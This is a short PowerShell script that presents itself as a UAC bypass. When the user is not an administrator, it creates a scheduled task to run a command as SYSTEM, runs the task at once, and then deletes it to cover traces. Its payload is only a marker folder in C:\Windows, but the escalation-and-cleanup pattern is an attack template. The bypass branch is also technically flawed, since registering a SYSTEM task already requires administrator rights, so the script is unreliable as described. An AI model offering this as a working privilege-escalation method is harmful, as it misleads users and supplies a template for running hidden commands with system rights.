if (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544") {
    # Running as Administrator
    mkdir C:\Windows\uas-bypass
} else {
    # Create a scheduled task to run as SYSTEM (elevated privileges)
    schtasks /create /tn "BypassUACTask" /tr "powershell.exe -Command mkdir C:\Windows\uas-bypass" /sc once /st 00:00 /ru SYSTEM /f

    # Run the scheduled task immediately
    schtasks /run /tn "BypassUACTask"

    # Optionally, delete the task after execution to clean up
    schtasks /delete /tn "BypassUACTask" /f
}
